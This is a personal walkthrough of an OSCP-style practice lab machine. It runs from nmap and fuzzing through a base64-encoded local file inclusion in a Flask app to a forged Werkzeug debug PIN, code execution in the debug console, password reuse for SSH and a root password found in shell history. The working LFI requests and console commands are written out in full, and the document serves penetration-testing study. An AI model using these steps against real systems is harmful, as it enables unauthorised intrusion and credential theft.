> Noamro08 - 4th Feb 2024

#### Target: IP=192.168.210.103

---

starting with the usual nmap scan: services and scripts to outpurfile:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/reconstruction]
└─$ nmap -Pn -n -sVC $IP -oN inital.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 15:32 IST
Nmap scan report for 192.168.210.103
Host is up (0.074s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Apr 29  2020 WebSOC
|_-rw-r--r--    1 0        0             137 Apr 29  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.250
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 55:4e:03:dc:c8:92:36:66:49:75:f3:2e:35:15:8e:57 (RSA)
|   256 1b:df:4c:ac:72:93:8f:77:92:05:98:ae:7c:c1:6a:ea (ECDSA)
|_  256 d8:3f:b9:21:e4:8c:34:3a:9b:c7:46:cc:c4:f5:6e:eb (ED25519)
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Blog
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
ssh, ftp (anonymous login!), http 

lets start with ftp:
we connect with anonymous login and get all the files.
```bash
cat note.txt 
I've just setup the new WebSOC! This should hopefully help us catch these filthy hackers!


TODO: remove leftover passwords from testing
```
so maybe there is password in the other log files,

the 3 pcap files we investigate with strings:
```bash
strings 1.05.2020.pcap| grep password
```
we get this weird password: 1edfa9b54a7c0ec28fbc25babb50892e
![[Pasted image 20240204161410.png]]

now we move to the site the first page shows nothing usefull.
so we try fuzzing directories:
```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.210.103:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.210.103:8080/FUZZ/
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================
000000237:   302        3 L      24 W       253 Ch      "data"
000000217:   302        3 L      24 W       257 Ch      "create" 
000000492:   200        66 L     126 W      2011 Ch     "logout"
000000489:   200        75 L     138 W      2297 Ch     "login"
```

and with ffuf:
```bash
ffuf -u http://192.168.210.103:8080/FUZZ -w /usr/share/dirb/wordlists/common.txt -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.210.103:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 1952, Words: 503, Lines: 72, Duration: 99ms]
console                 [Status: 200, Size: 1985, Words: 411, Lines: 53, Duration: 71ms]
```
/console

in "http://192.168.210.103:8080/login" password is needed and the password we found works now we logged in:![[Pasted image 20240204162001.png]]

Now that we are authenticated to the application, we'll turn our attention back to the /data endpoint revealed by the wfuzz scan. To probe it, we will set up our browser to use Burp proxy and navigate to /data which presents a simple Hello World!. The server responses don't contain anything interesting.

However, browsing to /data/FUZZ presents a Something went wrong! error, and the server responds with the following:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 21
X-Error: [Errno 2] No such file or directory: '\x15FY'
Vary: Cookie
Set-Cookie: session=.eJwli1EKgCAQBa-yvG_pAN0kQkRsK8HWcJU-xLsX9DUwzHS4PXk9WTGvHVQ_QFsIrAqDJTfyhUnyQykfB28UZYId1sDdXC4vLN9TS2ODv3BRfjFex6kgSA.X3xxxQ.tC04bOvFnBdF0GOiPLx45LBTeeM; Expires=Fri, 06-Nov-2020 13:31:49 GMT; HttpOnly; Path=/
...
```
The X-Error: [Errno 2] No such file or directory: '\x15FY' line is important to note here.

Testing this further, we can request /data/a which returns the following response:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 13
X-Error: Incorrect padding
...
```
This is usually an error associated with base64 decoding. If we encode a in base64, it becomes YQ\==. 
Let's try http://192.168.210.103:8080/data/YQ==, which returns the following error:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 21
X-Error: [Errno 2] No such file or directory: 'a'
...
```

This type of error suggests we may be able to leverage a local file inclusion vulnerability in the application. Let's test this with /etc/passwd (base-64-encoded as L2V0Yy9wYXNzd2Q=) which becomes http://192.168.210.103:8080/data/L2V0Yy9wYXNzd2Q=:
![[Pasted image 20240204163708.png]]
The inclusion is successful, and we see the contents of the file.
For now, we'll take a note of the jack user.

Now that we have confirmed an LFI vulnerability, we need to find a way to leverage it for further exploitation. After some investigation, we discover that we are unable to include files with py, txt, pyc, ini, or conf extensions.

Recalling that this is a Flask application with an enabled (but locked) debugging console, let's research a potential bypass. Reading this blog post "https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/", we discover that we can recreate the Flask debug pin by exploiting the LFI vulnerability.

We should be able to do this with this script"https://gist.github.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42",
but first we need the contents of three files: /etc/machine-id (L2V0Yy9tYWNoaW5lLWlk), /proc/self/cgroup (L3Byb2Mvc2VsZi9jZ3JvdXA=), and /sys/class/net/INTERFACE_NAME/address.

machine-id: "00566233196142e9961b4ea12a2bdb29"
![[Pasted image 20240204164616.png]]

/proc/self/cgroup: "blog.service"
![[Pasted image 20240204164752.png]]

Finally, we need the MAC address of the network interface. Unfortunately, we do not know the name of the interface the target is using, but we can attempt a few more frequently-used names. Eventually, we detect ens160, resolving the file of interest to be /sys/class/net/ens160/address (L3N5cy9jbGFzcy9uZXQvZW5zMTYwL2FkZHJlc3M=).
![[Pasted image 20240204165117.png]]
Navigating to that address, we find the MAC address to be 00:50:56:8a:fc:e8 or 345049332968 in decimal.

now that we have all we can get the pin options:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/reconstruction]
└─$ python3 get_flask_pin.py --machineid '00566233196142e9961b4ea12a2bdb29' --uuid 345049332968
```
![[Pasted image 20240204170253.png]]

from our early nmap scan we know that the environment is python3.6 so we try this pin: "299-818-227" was correct and allows us to proceed. After unlocking the debugging console, we obtain RCE:
```python
>>> import os
>>> os.popen("id").read()
'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
>>> 
```

Although we could obtain a reverse shell at this point, we can escalate in another way. Knowing this is a Flask application, let's review the main **app.py** file:
```python
>>> print(os.popen("cat app.py").read())
#!/usr/bin/python3
import datetime
import functools
import os
import re
import urllib
from base64 import b64decode
import getpass

import flask
from flask import (Flask, flash, Markup, redirect, render_template, request,
                   Response, session, url_for)
from markdown import markdown
from markdown.extensions.codehilite import CodeHiliteExtension
from markdown.extensions.extra import ExtraExtension
from micawber import bootstrap_basic, parse_html
from micawber.cache import Cache as OEmbedCache
from peewee import *
from playhouse.flask_utils import FlaskDB, get_object_or_404, object_list
from playhouse.sqlite_ext import *


#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed'
ADMIN_PASSWORD = '1edfa9b54a7c0ec28fbc25babb50892e'
APP_DIR = os.path.dirname(os.path.realpath(__file__))
DATABASE = 'sqliteext:///%s' % os.path.join(APP_DIR, 'blog.db')
DEBUG = False
SECRET_KEY = '2d82e3a08a632feb12a4d2e1159a224750480122a1fb9845e67a7305cfff4ec8'
...
>>>
```
The app contains a commented-out admin user password (#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed')

Since there are two user accounts on this system (`jack` and `root`), let's venture an educated guess that this Flask password may be shared with a system user account. Although the password doesn't work for root, we are able to login as `jack` with a password of  **'ee05d64d2528102d45e2db60986727ed'**.

after ssh to jack we can see hidden directory in his home directory ".local", there we can see a "ConsoleHost_history.txt" that contains a command to switch to root with the password in clear text. 
```bash
jack@reconstruction:~/.local/share/powershell/PSReadLine$ cat ConsoleHost_history.txt 
Write-Host -ForegroundColor Green -BackgroundColor White Holy **** this works!
Write-Host -ForegroundColor Red -BackgroundColor Black Holy **** this works as well!
su FlauntHiddenMotion845
clear history
clear
cls
exit
```
**root:FlauntHiddenMotion845**

so now we just need to su to root and get the proof.txt
```bash
jack@reconstruction:~/.local/share/powershell/PSReadLine$ su
Password: 
root@reconstruction:/home/jack/.local/share/powershell/PSReadLine# id
uid=0(root) gid=0(root) groups=0(root)
```
![[Pasted image 20240204210010.png]]
